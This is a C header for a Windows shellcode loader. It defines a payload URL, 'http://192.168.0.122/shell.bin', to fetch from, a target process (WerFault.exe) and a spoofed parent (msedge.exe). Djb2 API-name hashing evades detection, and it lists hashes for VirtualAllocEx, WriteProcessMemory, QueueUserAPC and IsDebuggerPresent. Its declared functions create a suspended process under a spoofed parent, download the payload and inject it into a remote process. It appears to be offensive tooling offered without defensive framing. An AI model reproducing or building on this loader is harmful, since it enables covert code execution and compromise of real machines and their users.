#pragma once

#include <windows.h>
#include <WinInet.h>
#include <Tlhelp32.h>
#include <winternl.h>

#include "syscalls.h"
#include "Evasion.h"

#pragma warning (disable:4996)
#pragma comment (lib, "Wininet.lib")

#define TARGET_PROCESS "WerFault.exe"
#define TARGET_PARENT L"msedge.exe"
#define PAYLOAD L"http://192.168.0.122/shell.bin"

//Api Hashing using Djb2
#define INITIAL_SEED 5
#define INITIAL_HASH 3997
#define HASH_ANSI(API) (HashStringDjb2A((PCHAR) API))
#define HASH_WIDE(API) (HashStringDjb2W((PWCHAR) API))

//String hashing
#define H_MOD_KERNEL32 0x541033ED //KERNEL32.DLL
#define H_FUNC_VIRTUALALLOCEXNUMA 0x47388AFD //VirtualAllocExNuma
#define H_FUNC_WRITEPROCESSMEMORY 0x526A1960 //WriteProcessMemory
#define H_FUNC_ISDEBUGGERPRESENT 0xBEF9C5DF //IsDebuggerPresent
#define H_FUNC_FLSALLOC 0xDF98BFAD //FlsAlloc
#define H_FUNC_VIRTUALALLOCEX 0x3944FF4C //VirtualAllocEx
#define H_FUNC_VIRTUALPROTECTEX 0xEE24BCC2 //VirtualProtectEx
#define H_FUNC_QUEUEUSERAPC 0x5CF56355 //QueueUserAPC
#define H_FUNC_OPENPROCESS 0xCD86296E //OpenProcess
#define H_FUNC_CREATEPROCESSA 0xF48BD2B1 //CreateProcessA
#define H_FUNC_GETENVIRONMENTVARIABLEA 0xE95DE699 //GetEnvironmentVariableA
#define H_FUNC_DEBUGACTIVEPROCESSSTOP 0x20957C25 //DebugActiveProcessStop

BOOL CreateSuspendedSpoofedProcess2(HANDLE hParentProcess, LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread);
int FindMyProcess(const char* ProcessName);
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress);